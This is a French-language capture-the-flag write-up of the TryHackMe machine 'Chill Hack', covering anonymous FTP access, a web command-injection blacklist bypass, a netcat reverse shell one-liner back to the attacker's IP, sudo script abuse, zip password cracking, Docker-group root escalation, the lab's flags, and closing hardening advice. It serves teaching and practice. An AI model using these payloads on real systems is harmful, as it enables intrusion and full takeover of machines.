---
layout: post
title: "Chill Hack - TryHackMe"
date: 2026-03-02
platform: "TryHackMe"
difficulty: "Easy"
category: [FTP, Command Injection, Docker]
image: "/assets/chill-hack/avatar.png"
description: "Chill Hack est une machine TryHackMe focalisée sur l’exploitation d’un serveur FTP anonyme, d’une injection de commande web et d’une escalade de privilèges via Docker."
---
# Chill Hack

Difficulté : Easy

Plateforme: TryHackMe

### Summary

Chill Hack est une machine `TryHackMe` focalisée sur l’exploitation d’un serveur `FTP` anonyme, d’une `injection de commande web` et d’une escalade de privilèges via `Docker`.

### Host Resolution

Nous allons commencer par associer l’adresse ip de notre cible au nom de domaine `chillhack.thm` 

```bash
echo "<SERVEUR_IP> chillhack.thm" >> /etc/hosts
```

### Nmap Scan

La reconnaissance a débuté par un scan `nmap` de la cible afin de déterminer les ports ouverts

```bash
nmap -sC -sV chillhack.thm
```

On a obtenu

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Le scan révèle la présence de trois ports :

- Port FTP (21)
- Port SSH (22)
- Port HTTP (80)

### **Web application Discovery**

Après l’identification du port 80 comme principale surface d'attaque lors de l'analyse `Nmap`, nous avons interagi avec ce port via le navigateur à l’adresse

```
http://chillhack.thm
```

![Image 1](/assets/chill-hack/1.png)

La page d’accueil présente une plateforme d’informations sur les jeux. 

### FTP ENUMERATION

Le scan nmap nous a indiqué que la connection anonyme est possible. Nous allons essayer de nous y connecter. 

```bash
ftp chillhack.thm
```

Username: `anonymous`

Password: (vide)

Une fois connecté nous pouvons lister le contenu du serveur

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              90 Oct 03  2020 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (90 bytes).
226 Transfer complete.
90 bytes received in 00:00 (0.13 KiB/s)
ftp> exit
221 Goodbye.
```

On a pu récupérer le fichier `note.txt` . Analysons son contenu

```bash
───────┬──────────────────────────────────────────────────────────────────────────────────
       │ File: note.txt
───────┼──────────────────────────────────────────────────────────────────────────────────
   1   │ Anurodh,
   2   │ 
   3   │ I have create a helpdesk portal let me know if any problems occur.
   4   │ 
   5   │ - Apaar
───────┴────────────────
```

Cela indique qu’un portail `helpdesk` a été créé.

### Répertoires cachés

Nous allons lister les dossiers cachés grâce à `gobuster` 

```bash
gobuster dir -u http://chillhack.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

On a le résultat suivant:

```bash
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://chillhack.thm/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://chillhack.thm/css/]
/fonts                (Status: 301) [Size: 314] [--> http://chillhack.thm/fonts/]
/images               (Status: 301) [Size: 315] [--> http://chillhack.thm/images/]
/index.html           (Status: 200) [Size: 34182]
/js                   (Status: 301) [Size: 311] [--> http://chillhack.thm/js/]
/secret               (Status: 301) [Size: 315] [--> http://chillhack.thm/secret/]
/server-status        (Status: 403) [Size: 278]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
```

On tombe sur un dossier intéressant `/secret` . En se rendant sur sur `http://chillhack.thm/secret` on tombe sur une page web qui contient un champ de saisie de commande.

![Image 2](/assets/chill-hack/2.png)

Cependant plusieurs commandes sont sur une `blacklist` et nous ne pouvons pas les exécuter. C’est le cas de `ls` , `cat` , `id` … Pour contourner cela nous allons utiliser des caractères spéciaux de bash tels que \ .  Exécutons :

```bash
l\s
```

On a le résultat

```bash
index.php
```

Cela prouve que l’application est vulnérable à une injection de commande. 

### Obtention du shell

Nous allons lancer un écouteur sur notre machine qui attend une connexion

```bash
nc -lvnp 9001
```

Ensuite dans le champ de saisie nous allons entrer le payload de reverse shell suivant

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <notre_ip> 9001 >/tmp/f
```

On obtient un shell on peut le stabiliser

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo;fg
www-data@chillhack:/var/www/html/secret$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral Movement

Explorons les dossiers de la machine

```bash
www-data@chillhack:/var/www/html/secret$ ls /home
anurodh  apaar
```

On a deux utilisateurs `anurodh` et `apaar` . Vérifions nos droits `sudo`

```bash
www-data@chillhack:/var/www/html/secret$ sudo -l
Matching Defaults entries for www-data on chillhack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on chillhack:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpyourself.sh
```

On peut donc exécuter le script `/home/apaar/.helpyourself.sh` en tant qu’utilisateur `apaar` sans devoir fournir de mot de passe. Analysons son contenu

```bash
www-data@chillhack:/var/www/html/secret$ cat /home/apaar/.helpyourself.sh
#!/bin/bash

echo "#########################################################"
echo "#                                                       #"
echo "#                    I am here to help                  #"
echo "#                                                       #"
echo "#########################################################"

read -p "Enter the command you want to run: " cmd
$cmd

```

Le script nous demande d’entrer une commande qu’il exécute. On peut donc l’exécuter pour obtenir un shell en tant qu’utilisateur apaar

```bash
www-data@chillhack:/var/www/html/secret$ sudo -u apaar /home/apaar/.helpyourself.sh
#########################################################
#                                                       #
#                    I am here to help                  #
#                                                       #
#########################################################
Enter the command you want to run: /bin/bash
apaar@chillhack:/var/www/html/secret$ id
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
```

On est connecté en tant qu’apaar on peut donc récupérer le user flag.

### Capture User Flag

```bash
apaar@chillhack:/var/www/html/secret$ cd /home/apaar
apaar@chillhack:~$ ls
local.txt
apaar@chillhack:~$ cat local.txt 
{USER-FLAG: b64ac2ca1117d09ad47c87174159a00b}
```

**User Flag** : {USER-FLAG: b64ac2ca1117d09ad47c87174159a00b}

### Escalade de privilège

On a remarqué que l’utilisateur apaar possède une clé ssh privée dans le dossier `.ssh` . On récupère le contenue de la clé puis on fait un `Ctrl+C`

Sur notre machine on peut exécuter

```bash
ssh -L 9001:localhost:9001 apaar@chillhack.thm -i id_rsa
```

Ensuite dans notre navigateur on peut se rendre sur `http://localhost:9001` . On tombe sur un portail de connexion

![Image 4](/assets/chill-hack/4.png)

On peut essayer de lister les dossiers chachés

```bash
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://localhost:9001
```

On a le résultat

```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost:9001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/images               (Status: 301) [Size: 314] [--> http://localhost:9001/images/]
/index.php            (Status: 200) [Size: 572]
/server-status        (Status: 200) [Size: 8600]
Progress: 4750 / 4750 (100.00%)
===============================================================
Finished
===============================================================
```

Il y a un dossier image et on peut télécharger l’image du hackeur et extrire ses métadonnées avec `steghide`

```bash
wget http://localhost:9001/images/hacker-with-laptop_23-2147985341.jpg
steghide extract -sf hacker-with-laptop_23-2147985341.jpg
```

Steghide extrait un fichier `backup.zip` mais en essayer de le dezipper via `unzip` un mot de passe nous est demander. On peut craquer ce mot de passe avec john

```bash
zip2john backup.zip > zip.hash
john zip.hash
```

John arrive à craquer le code qui est `pass1word` . On peut donc exécuter

```bash
unzip backup.zip
Password: pass1word
```

Le zip contient le fichier `source_code.php` dont le contenu est : 

```bash
<html>
<head>
        Admin Portal
</head>
        <title> Site Under Development ... </title>
        <body>
                <form method="POST">
                        Username: <input type="text" name="name" placeholder="username"><br><br>
                        Email: <input type="email" name="email" placeholder="email"><br><br>
                        Password: <input type="password" name="password" placeholder="password">
                        <input type="submit" name="submit" value="Submit"> 
                </form>
<?php
        if(isset($_POST['submit']))
        {
                $email = $_POST["email"];
                $password = $_POST["password"];
                if(base64_encode($password) == "IWQwbnRLbjB3bVlwQHNzdzByZA==")
                { 
                        $random = rand(1000,9999);?><br><br><br>
                        <form method="POST">
                                Enter the OTP: <input type="number" name="otp">
                                <input type="submit" name="submitOtp" value="Submit">
                        </form>
                <?php   mail($email,"OTP for authentication",$random);
                        if(isset($_POST["submitOtp"]))
                                {
                                        $otp = $_POST["otp"];
                                        if($otp == $random)
                                        {
                                                echo "Welcome Anurodh!";
                                                header("Location: authenticated.php");
                                        }
                                        else
                                        {
                                                echo "Invalid OTP";
                                        }
                                }
                }
                else
                {
                        echo "Invalid Username or Password";
                }
        }
?>
</html>

```

Ce script php vérifie si l’encodage en base64 du mot de passe est IWQwbnRLbjB3bVlwQHNzdzByZA== et affiche Welcome Anurodh! en cas de connexion réussie. On a donc récupéré:

- Username : anurodh
- Password: !d0ntKn0wmYp@ssw0rd (décodé avec Cyberchef)

On peut donc sur la machine cible avec ces identifiants

```bash
su anurodh
Password: !d0ntKn0wmYp@ssw0rd
```

On exécutant la commande `id` on remarque qu’il appartient au groupe `999(docker)` qui laisse présager une escalade de privilège par docker. On peut donc exécuter le payload adapté à cette situation

```bash
docker run -v /:/mnt -it alpine chroot /mnt
```

On obtient un accès root. On peut donc lire le flag root

```bash
root@4f17b165bd5e:/# ls /root
proof.txt  snap
root@4f17b165bd5e:/# cat /root/proof.txt 

                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

Congratulations! You have successfully completed the challenge.

         ,-.-.     ,----.                                             _,.---._    .-._           ,----.  
,-..-.-./  \==\ ,-.--` , \   _.-.      _.-.             _,..---._   ,-.' , -  `. /==/ \  .-._ ,-.--` , \ 
|, \=/\=|- |==||==|-  _.-` .-,.'|    .-,.'|           /==/,   -  \ /==/_,  ,  - \|==|, \/ /, /==|-  _.-` 
|- |/ |/ , /==/|==|   `.-.|==|, |   |==|, |           |==|   _   _\==|   .=.     |==|-  \|  ||==|   `.-. 
 \, ,     _|==/==/_ ,    /|==|- |   |==|- |           |==|  .=.   |==|_ : ;=:  - |==| ,  | -/==/_ ,    / 
 | -  -  , |==|==|    .-' |==|, |   |==|, |           |==|,|   | -|==| , '='     |==| -   _ |==|    .-'  
  \  ,  - /==/|==|_  ,`-._|==|- `-._|==|- `-._        |==|  '='   /\==\ -    ,_ /|==|  /\ , |==|_  ,`-._ 
  |-  /\ /==/ /==/ ,     //==/ - , ,/==/ - , ,/       |==|-,   _`/  '.='. -   .' /==/, | |- /==/ ,     / 
  `--`  `--`  `--`-----`` `--`-----'`--`-----'        `-.`.____.'     `--`--''   `--`./  `--`--`-----``  

--------------------------------------------Designed By -------------------------------------------------------
                                        |  Anurodh Acharya |
                                        ---------------------

                                     Let me know if you liked it.

Twitter
        - @acharya_anurodh
Linkedin
        - www.linkedin.com/in/anurodh-acharya-b1937116a
```

**Root Flag** : {ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}

Pourquoi ça marche ? 

> Les membres du groupe docker peuvent lancer des conteneurs et le `deamon docker` tourne en root. L’option `-v /:/mnt` monte le système hôte dans le conteneur et `chroot /mnt` change la racine vers le système réel.
> 

## Recommendations

- FTP Anonyme
    - Désactiver l’accès anonyme
    - Restreindre l’accès aux fichiers sensibles
    - Désactiver le services si il n’est pas vraiment nécéssaire
- Command Injection Web
    - Ne jamais exécuter directement une entrée utilisateur
    - Eviter l’appel au shell si inutile
    - Utiliser des whitelist bien plus sûrs que des blacklist
- Escalade de privilèges
    - Supprimer tous les scripts non utile
    - Limiter les droits des utilisateurs strictement à ceux dont ils ont besoin
    - Supprimer les utilisateurs non root du groupe docker
